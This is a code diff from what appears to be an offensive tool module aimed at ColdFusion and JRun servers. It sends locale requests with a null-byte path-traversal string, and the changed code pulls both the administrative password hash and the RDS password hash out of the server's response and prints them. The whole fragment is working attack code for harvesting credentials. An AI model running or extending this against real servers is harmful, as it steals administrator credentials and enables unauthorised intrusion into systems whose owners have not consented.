@@ -60,9 +60,13 @@ class Auxiliary:
                 if response.status_code == 200:
 
                     pw_hash = re.findall("password=(.*?)\r\n", response.content)
+                    rds_hash = re.findall("rdspassword=(.*?)\n", response.content)
                     if len(pw_hash) > 0:
                         utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
+                        if len(rds_hash) > 0:
+                            utility.Msg("RDS hash: %s" % rds_hash[1], LOG.SUCCESS)
                         return
+
 
         utility.Msg("Hash not found, attempting JRun..")
         uri = "{0}?locale={1}" + ver_dir["JRun"] + "%00en"
@@ -77,8 +81,11 @@ class Auxiliary:
             if response.status_code == 200:
 
                 pw_hash = re.findall("password=(.*?)\r\n", response.content)
+                rds_hash = re.findall("rdspassword=(.*?)\n", response.content)
                 if len(pw_hash) > 0:
                     utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
+                    if len(rds_hash) > 0:
+                        utility.Msg("RDS hash: %s" % rds_hash[1], LOG.SUCCESS)
                     return
 
     def run_latter(self, fingerengine, fingerprint):
